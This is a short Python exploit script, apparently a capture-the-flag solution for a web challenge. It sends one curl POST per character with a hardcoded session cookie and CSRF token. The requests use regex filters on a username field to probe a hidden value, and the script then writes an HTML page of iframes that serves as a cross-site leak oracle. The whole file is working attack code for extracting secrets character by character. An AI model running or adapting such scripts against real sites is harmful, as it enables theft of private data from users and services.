import string
import subprocess
import re


BASE_CURL = "curl -s 'http://snippet.chall.lmws.hacq.me/post' -H 'Connection: keep-alive' -H 'Cache-Control: max-age=0' -H 'Origin: http://snippet.chall.lmws.hacq.me' -H 'Upgrade-Insecure-Requests: 1' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3' -H 'Referer: http://snippet.chall.lmws.hacq.me/' -H 'Accept-Encoding: gzip, deflate' -H 'Accept-Language: ja,en-US;q=0.9,en;q=0.8' -H 'Cookie: session=.eJwtj0tuAjEQBe_iNQu7p-1uc5lRf5UAAmkGVlHunolg9Ralkur9lDW32L_K-bm94lTWby_nMgZEQDDbANSp2EgcoIcNqTV4YVy4Izgo9yY-I0koJ1VytmkombLoqK6NYOIAZxHrMPoBiSeiBDXIRpghAyOrMbB0owktyqnYvuX6fFzj_t8jR5FWrLLwCOXJCq1ibxpS0RpxV3HGw3vtsb1PXNJv110-U37_ANX1Q_g.Xdjjkw.RJLSlOJwYTj6S9HQA6AnF0hEtsU' --data 'csrf_token=IjZhNjYyYjA0MGEzODZlYjg5OGIyMTA0NTFiZWEwNGMxNzg1YmFkODQi.XdkGYg.hEhtlGyDl9rWMrii3Aq-yqBQFb8&title=guess_{ch}&content=&filter=job-.*&filter=gender-.*&filter=zone-.*&filter=username-^{ch}' --compressed --insecure"


PAT = 'href="(.*)"'

chars = """.0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()+,-/:;<=>?@_`{|}~"""
html = ''
for ch in chars:
    curl = BASE_CURL.format(ch=ch)
    comp = subprocess.run(curl, shell=True, stdout=subprocess.PIPE)
    print(comp.stdout)
    path = re.findall(PAT, str(comp.stdout))[0]

    html += '<iframe id="{}" src="{}"></iframe>'.format(ch, "http://snippet.chall.lmws.hacq.me" + path)
    html += '\n'


with open("index.html", "w") as f:
    f.write(html)
